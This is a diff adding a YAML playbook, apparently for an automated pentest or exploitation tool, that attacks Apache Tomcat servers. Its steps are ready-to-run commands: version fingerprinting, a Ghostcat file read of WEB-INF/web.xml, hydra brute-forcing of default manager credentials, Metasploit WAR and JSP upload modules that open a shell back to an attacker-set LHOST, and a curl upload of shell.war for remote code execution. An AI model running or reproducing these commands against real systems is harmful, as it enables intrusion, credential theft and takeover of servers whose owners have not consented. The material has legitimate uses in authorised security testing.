@@ -1,0 +1,45 @@
+id: tech_tomcat
+title: "Apache Tomcat — manager creds + Ghostcat (CVE-2020-1938) + WAR upload"
+phase: exploit
+mitre: ["T1190", "T1505.003"]
+trigger:
+  services: ["http", "https", "ajp13"]
+  ports:    [80, 443, 8080, 8443, 8009, 8005]
+  technologies: ["tomcat", "apache tomcat", "coyote"]
+  cves:     ["CVE-2020-1938", "CVE-2017-12617", "CVE-2017-12615"]
+keywords: ["tomcat", "ghostcat", "manager", "war upload", "coyote", "ajp"]
+preconditions:
+  - "Tomcat banner visible (Server: Apache-Coyote, X-Powered-By, /docs/, /examples/)"
+steps:
+  - tool: curl
+    cmd:  "curl -s -I {base_url}/ | grep -i server; curl -s {base_url}/docs/ | grep -oE 'Apache Tomcat/[0-9.]+'"
+    why:  "Banner + version disclosure"
+  - tool: nmap
+    cmd:  "nmap -sV -p8009,8005 --script=ajp-headers,ajp-methods {target}"
+    why:  "AJP connector — CVE-2020-1938 Ghostcat lives here"
+  - tool: ajpfuzzer
+    cmd:  "python3 ajpShooter.py http://{target}:{port}/ 8009 /WEB-INF/web.xml read"
+    why:  "CVE-2020-1938 — read arbitrary file from webapp ROOT (Tomcat <7.0.100, <8.5.51, <9.0.31)"
+  - tool: hydra
+    cmd:  "hydra -L /usr/share/seclists/Usernames/cirt-default-usernames.txt -P /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt {target} http-get '/manager/html'"
+    why:  "Default Tomcat manager creds (tomcat/tomcat, admin/admin, manager/manager)"
+  - tool: msfconsole
+    cmd:  "msfconsole -qx 'use auxiliary/scanner/http/tomcat_mgr_login; set RHOSTS {target}; set RPORT {port}; run'"
+    why:  "Bulk default-cred sweep across many hosts"
+  - tool: msfconsole
+    cmd:  "msfconsole -qx 'use exploit/multi/http/tomcat_mgr_upload; set RHOSTS {target}; set RPORT {port}; set HTTPUSERNAME tomcat; set HTTPPASSWORD tomcat; set LHOST {LHOST}; set TARGETURI /manager; run'"
+    why:  "Manager-app WAR upload → JSP shell → tomcat user RCE"
+  - tool: curl
+    cmd:  "curl -u tomcat:tomcat --upload-file shell.war '{base_url}/manager/text/deploy?path=/shell&update=true'"
+    why:  "Manual WAR upload + access at /shell/ for RCE"
+  - tool: msfconsole
+    cmd:  "msfconsole -qx 'use exploit/multi/http/tomcat_jsp_upload_bypass; set RHOSTS {target}; set RPORT {port}; set TARGETURI /; set LHOST {LHOST}; run'"
+    why:  "CVE-2017-12617 PUT method JSP upload (Tomcat 7.0.0-7.0.79, 8.5.0-8.5.22, 9.0.0-9.0.0.M22)"
+expected_outcome: "Tomcat user shell via WAR upload; arbitrary file read via Ghostcat"
+fallbacks:
+  - "PUT method enabled (CVE-2017-12615) → directly upload .jsp without manager creds"
+  - "/host-manager (separate from /manager) — sometimes weaker creds"
+  - "Read /WEB-INF/web.xml via Ghostcat → DB creds, internal API endpoints"
+references:
+  - "https://tomcat.apache.org/security.html"
+  - "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat"
